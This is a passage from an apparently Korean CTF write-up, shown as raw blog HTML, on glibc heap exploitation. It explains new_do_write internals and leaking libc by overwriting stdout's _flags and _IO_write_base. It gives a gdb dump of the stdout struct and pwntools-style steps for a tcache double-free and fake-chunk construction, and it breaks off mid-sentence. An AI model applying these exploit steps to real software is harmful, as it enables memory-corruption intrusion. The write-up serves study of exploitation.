punctuation\">{</span>\n\t\tcount <span class=\"token operator\">=</span> <span class=\"token function\">new_do_write</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> do_write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tto_do <span class=\"token operator\">-=</span> count<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>count <span class=\"token operator\">&lt;</span> do_write<span class=\"token punctuation\">)</span>\n\t\t    <span class=\"token keyword\">return</span> n <span class=\"token operator\">-</span> to_do<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>new_do_write(f,s,do_write) 함수 호출</li>\n<li>fp, stdout 구조체</li>\n</ul>\n<h2 id=\"new_do_write-함수\" style=\"position:relative;\"><a href=\"#new_do_write-%ED%95%A8%EC%88%98\" aria-label=\"new_do_write 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>new_do_write 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_IO_IS_APPENDING</span> <span class=\"token expression\"><span class=\"token number\">0x1000</span></span></span>\n\n<span class=\"token keyword\">static</span> size_t <span class=\"token function\">new_do_write</span> <span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> size_t to_do<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  size_t count<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 전달 받은 파일 포인터의 _flags 멤버 변수의 값이</span>\n\t<span class=\"token comment\">//  _IO_IS_APPENDING 비트를 포함하고 있는지 확인한다.</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_flags <span class=\"token operator\">&amp;</span> _IO_IS_APPENDING<span class=\"token punctuation\">)</span>                              \n    fp<span class=\"token operator\">-></span>_offset <span class=\"token operator\">=</span> _IO_pos_BAD<span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// 전달 받은 파일 포인터의 _IO_read_end 포인터와</span>\n\t<span class=\"token comment\">// _IO_write_base 포인터가 다른지 확인한다.</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_IO_read_end <span class=\"token operator\">!=</span> fp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">)</span>                  \n    <span class=\"token punctuation\">{</span>\n      off64_t new_pos\n\t<span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSSEEK</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_write_base <span class=\"token operator\">-</span> fp<span class=\"token operator\">-></span>_IO_read_end<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>new_pos <span class=\"token operator\">==</span> _IO_pos_BAD<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      fp<span class=\"token operator\">-></span>_offset <span class=\"token operator\">=</span> new_pos<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// 만약 line 8의 조건에서 값이 같다면</span>\n<span class=\"token comment\">//  _IO_SYSWRITE 함수를 통해 new_do_write 함수의 인자인 data를 to_do의 크기만큼 출력한다.</span>\n  count <span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSWRITE</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> to_do<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   \n                      \n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">&amp;&amp;</span> count<span class=\"token punctuation\">)</span>\n    fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">=</span> <span class=\"token function\">_IO_adjust_column</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">_IO_setg</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  fp<span class=\"token operator\">-></span>_IO_write_base <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_IO_write_ptr <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">;</span>\n  fp<span class=\"token operator\">-></span>_IO_write_end <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_mode <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span>\n\t\t       <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_flags <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>_IO_LINE_BUF <span class=\"token operator\">|</span> _IO_UNBUFFERED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t       <span class=\"token operator\">?</span> fp<span class=\"token operator\">-></span>_IO_buf_base <span class=\"token operator\">:</span> fp<span class=\"token operator\">-></span>_IO_buf_end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> count<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>stdout→flags 에 <code class=\"language-text\">_IO_IS_APPENDING</code> 이 포함되어 있어야 한다.</li>\n<li>_IO_new_do_write, _IO_SYSWRITE를 통해 _IO_write_base를 출력한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">count <span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSWRITE</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> to_do<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">--</span><span class=\"token operator\">></span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">_IO_sputn</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> hp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">,</span> to_flush<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> to_flush<span class=\"token punctuation\">)</span>\n\tresult <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"how-to-exploit-using-stdout\" style=\"position:relative;\"><a href=\"#how-to-exploit-using-stdout\" aria-label=\"how to exploit using stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to exploit using stdout</h2>\n<ul>\n<li>flags, _IO_write_base를 조작 한다.</li>\n<li>_IO_write_base를 하위 바이트만 조작하여 라이브러리 줏소가 위치한 주소를 가리키게 하여 라이브러리 주소를 출력할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token constant\">stdout</span>\n$<span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  _flags <span class=\"token operator\">=</span> <span class=\"token number\">0xfbad2887</span><span class=\"token punctuation\">,</span> \n  _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e4</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">132</span><span class=\"token operator\">></span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> \n  _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dcfa00</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdin_<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span> \n  _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _old_offset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">,</span> \n  _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd18c0</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_1_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _offset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">,</span> \n  _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dcf8c0</span> <span class=\"token operator\">&lt;</span>_IO_wide_data_1<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _mode <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">,</span> \n  _unused2 <span class=\"token operator\">=</span> <span class=\"token char\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>해당 구조체를 덮어쓰기 위해서는 라이브러리 주소를 이용해야 한다.</li>\n<li>main_arena 영역 주소가 힙 청크에 남아야 하며 그렇게 하기 위해서는 unsorted bin을 이용해야 한다.</li>\n</ul>\n<h2 id=\"double-free-bug\" style=\"position:relative;\"><a href=\"#double-free-bug\" aria-label=\"double free bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Double Free Bug</h2>\n<ul>\n<li>Double Free Bug가 발생하면 같은 포인터를 두 번 가리키며 새로 할당해 값을 쓰게 된다면 ForwarD PTR를 덮을 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free test</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB00lEQVQoz4WQ6ZKaUBCFfY2ZyAW5yL0ssu+WiIILLsjixmgQDabm/Z8glZhfU9FUnX/dX59zupUtJ/EsHgSh6bi6rQHIkgzr+p5qGgTNAogU3caSwsu67vQ936cYjoDIcFwsKi0tkk2Pt1eWPLO0viUogmZxsoFVi2MFDkDcphFBIxIiAFG7w5IMJhn8uNt6m7ptUXzv62+hCaQRYHiCRgBigsYA4sfqM7WIuUv2RDA02xObUgKK4SgGPWb/h9tTB4ji+0D7FlmkPAJdiYB8h8U0QgyHyS4GL2AgCRD1OMFQxT6rjpFui7YtmzwvYdNmuwhTEFPMX32FQ1dw1N4iHG+mUZzP9CBk9SEtD1hBM1jRxqKGBAUJGhIklv+SopVmRb49RovV5nAoq/pYNZLuGJ5fVnV5ucZJSkJEMbjzT+dltttsy9FksS4O5ff6dG00yzU9/1Q3H3WzTAsSoqed1/k+3f2GN7vj6XKrms8/8PBUN+frPcl3r769TLdJcQwm8Trfl1V9ut5VyzG8QXm5lpfbKitI5rlzUhyz/cd4ukz35fn6o7p/apZn9Yfn2/18+5kUu1ex/WgeRLHl+cEknq/TeFOIii4bzjzJ5kk+DKcvYv8CM+iZLoG+/74AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png\"\n        srcset=\"/static/086826f90fba136c03d4bc31a9fe97f5/e9ff0/4.png 180w,\n/static/086826f90fba136c03d4bc31a9fe97f5/f21e7/4.png 360w,\n/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png 720w,\n/static/086826f90fba136c03d4bc31a9fe97f5/ee455/4.png 863w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FD 위치의 주소 값이 변경되어 4바이트의 0x42가 들어 가 tcache영역을 확인하게 되면 다음 주소 값이 변경된 것을 확인할 수 있겠다.</li>\n</ul>\n<h2 id=\"fake-chunk-구성\" style=\"position:relative;\"><a href=\"#fake-chunk-%EA%B5%AC%EC%84%B1\" aria-label=\"fake chunk 구성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fake chunk 구성</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>unsorted bin을 구성하기 위해서는 tcache를 사용하지 않게끔 7개의 bin을 꽉 채워야 하며 <code class=\"language-text\">0x78</code> 크기 까지 할당할 수 있기 때문에 <code class=\"language-text\">0x410</code> 초과의 크기만큼 할당한후 해제하여 unsorted bin으로 만드는 것은 불가능하다.</li>\n<li>Fake Chunk를 해제해 main_arena 영역의 주소를 써야 하며 Fake Chunk를 해제하기 위해서는 인접한 청크가 존재해야 한다.</li>\n<li>0x555555757260 + 0xd0 주소에 힙 청크가 존재해야 한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 469px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAADEElEQVQoz1WSy24cVRCG+xUQijBERjISiYSIhE1M7BnPpadv0326z/Tt3Prcuz1je8b2EDsXiCUUCbHJDolFngPlBViy4J1Qm2yQallflf76yknGbjzy4oPhdOjPZ2npsbW9vWpfbvTN2rw4l9tkUh5+M/aPM5IaBg2FlmSmybt4mDuwovhspX9/o9+9Zu9uF+fd6dn1avP8bLPtzrdXz1/Diuw9+nbig+X65uLy+cXVi/PLm8vtq4JLJ4nz8sfly3/e//zXH2/+fg/vzgqIUaMw4xURXNnR1Huws7t/NKyEwkoiZWqpmLJzjp20QDnmc4wChCY5nDaVuFzL6428usBnK3W9mRVw97snA5SxzYXcruX2Ulyv7e02wrUDijqvm0WOYY6DEJz4YbNc8uWq6dqcCWLsKAgffv3o6WCMGsOkZtKSRlFp/Sj5uBlWGBR4FiXDqU+FJsI00hBhdbeaeOEnD744eDbE0jKlqWqJ1Nwu5yl0krzOEcsKDHI0i8BgGlBpaN9nsDDCdiHI9g+PB1O/YopJTaUloodjuHCyEpVELCqaFihMsqEbUNVS1TbaEmm57WCFXv10583TslGNtlS3VBrRLWOY38OYLyqcFThK4NANmG6Z/girbuVFyd0vb384mdbcMGX60dKI9h5OSpwTkdU0yWs3jAcTn/RpNZUac0Olrgj788OHGJYVU8J23HRMter0HCwKB7gB8GPgBkEEYlieuEHdSCIM4apiikhT0ebtr78djaZjP/bnwJunswgECRyMXSedeOksXPRwmizK0SwsKcdc17QpiaDSeHPw6WcPHz/Zn4bJLOrLDRM/yY5HUwdUpGAqQyyriDcHg4l/fzDbZxZ95okfff7lV4eDMdWnwnaiXXLTmdVFmpcO6FU1sERpiSMAe8/K9rCyuIeXbjDf2d37/ugE8f5JqLL/eY6zXhW+V0XSAgVxdvL/a+vTlRv28NPjUf8k2rBelZXdKoG5E8NyUbM0RyDv4ePxDHGFuMJcVkw2ph174c7u3sGzYckkbiTiqmaC6jYC2b/2TzxLhI1ONAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4_1.png\"\n        title=\"./4_1.png\"\n        src=\"/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png\"\n        srcset=\"/static/2942358e137802a86bff75bb0928b56a/e9ff0/4_1.png 180w,\n/static/2942358e137802a86bff75bb0928b56a/f21e7/4_1.png 360w,\n/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png 469w\"\n        sizes=\"(max-width: 469px) 100vw, 469px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>0x555555757260+0xd0 주소에 청크가 존재해야 하며 해제할 시 정상적으로 해제가 가능하지만 아직 해제는 불가능 하다 정상적으로 할당된 청크가 아니기 때문이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 471px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVElEQVQY0z2P21KDMBRF+Yz6UGfqiw86tmqt9VZtKQUkpCHkciAhJIFW/f8fcFDHmfN2Zu21d7C7WUTzZXJ7//K6TTF9eA1RwTADRMp3wvccdhk+v5yenV9c3S6n87+b3T1czuZBXgoqNWGAGWyT7GUTK9cr19fGYgZCNc9v29F4cnP/JI3XvtP+qGxvj1+45AEqBBEqLzgqxDbNnte7yjgwrjKWKaN99xYlo/HkevHIlIWmBeOkbpXrMWVBVjDCq5xwVPAwzp7W0fBubGWs0NZ0h80uHY0ns8VjqcwAN078wDllQU6H2piKHzMazK0fzK3jv3Cc/pq5HhKh9bKx2h+G2nsmS2j2pcxLiNJ8FQ6ba9tr14Hp7OEzjN//Nyvrle2r1pv+gzAZxIhkhCeIxKhYhfFyFVJQVNYl1ITXUpvVJjo5PZvOl5hXVFQUFOGwZ7COkm/Pr4CKLJurVAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png\"\n        srcset=\"/static/5864bba5e66045b88f0ec3e916611759/e9ff0/5.png 180w,\n/static/5864bba5e66045b88f0ec3e916611759/f21e7/5.png 360w,\n/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png 471w\"\n        sizes=\"(max-width: 471px) 100vw, 471px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"how-to-free\" style=\"position:relative;\"><a href=\"#how-to-free\" aria-label=\"how to free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to Free?</h2>\n<ul>\n<li>첫 번째 할당 때 FD의 한 바이트를  “\\x70”으로 덮어 써 Fake Chunk의 데이터 부분을 가리키도록 한다. (FD: 